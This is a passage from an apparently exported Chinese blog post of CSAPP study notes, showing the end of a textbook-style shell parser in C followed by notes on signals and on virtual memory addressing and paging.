class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">	buf++;</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) &#123;</span><br><span class="line">	argv[argc++] = buf;</span><br><span class="line">	*delim = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	buf = delim + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">	       buf++;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">	    buf++;</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">&#x27;&amp;&#x27;</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">	argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;&amp;&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span>    <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="8-5-信号"><a href="#8-5-信号" class="headerlink" title="8.5 信号"></a>8.5 信号</h4><p>信号是一种更高层的软件形式的异常，它允许进程和内核中断其他进程。一个信号就是一条小消息，它通知进程系统中发生一个某种类型的事件。每种信号对应某种系统事件，低层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程而言是不可见的，信号提供一种机制，通知用户进程发生了这些异常，比如，一个进程试图除以0，那么内核就会发送一个SIGFPE信号，如果一个进程执行一条非法指令，那么内核就发送给它一个SIGSEGV信号。下图为linux信号。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/95.png" class="">
-
-<h2 id="第九章：虚拟内存"><a href="#第九章：虚拟内存" class="headerlink" title="第九章：虚拟内存"></a>第九章：虚拟内存</h2><p>什么是虚拟内存？</p>
-<p>​    内存容易被破坏，如果一个进程写入了另一个进程使用的内存，就有可能会造成崩溃。虚拟内存是对主存概念的抽象概念。</p>
-<p>用虚拟内存的好处：</p>
-<ul>
-<li>根据特定的需要在磁盘和主存之间告诉高速传输数据，从而高效使用缓存</li>
-<li>为每个进程提供相同的地址空间，从而简化内存管理</li>
-<li>保护每个内存空间的进程不被其他进程破坏</li>
-</ul>
-<h4 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h4><p>早期PC：物理寻址</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/96.png" class="">
-
-<p>近代PC：虚拟寻址</p>
-<p>​    CPU生成虚拟地址访问主存，虚拟地址被送到主存之前首先通过MMU转换为物理地址</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/97.png" class="">
-
-
-
-<h4 id="9-2-地址空间"><a href="#9-2-地址空间" class="headerlink" title="9.2 地址空间"></a>9.2 地址空间</h4><p>非负整数地址的有序集合，在地址空间中的整数通常是连续的，我们称之为<strong>线性地址空间</strong>。</p>
-<h4 id="9-3-虚拟内存作为缓存工具"><a href="#9-3-虚拟内存作为缓存工具" class="headerlink" title="9.3 虚拟内存作为缓存工具"></a>9.3 虚拟内存作为缓存工具</h4><p>概念上而言，可以将虚拟内存（VM）理解为一个由存放在磁盘上的m个连续的字节大小的单元所组成的数组。</p>
-<p>VM系统将虚拟内存分割为虚拟页，同时将物理内存分割为物理页，每个页大小为2^p字节。</p>
-<p>在任意时刻，虚拟页面的集合都被分为三个不相交的子集：</p>
-<ul>
-<li>未分配的VM系统还未分配（或者创建）的页。未分配的块没有</li>
-</ul>
 ]]></content>
       <categories>
         <category>CSAPP</category>
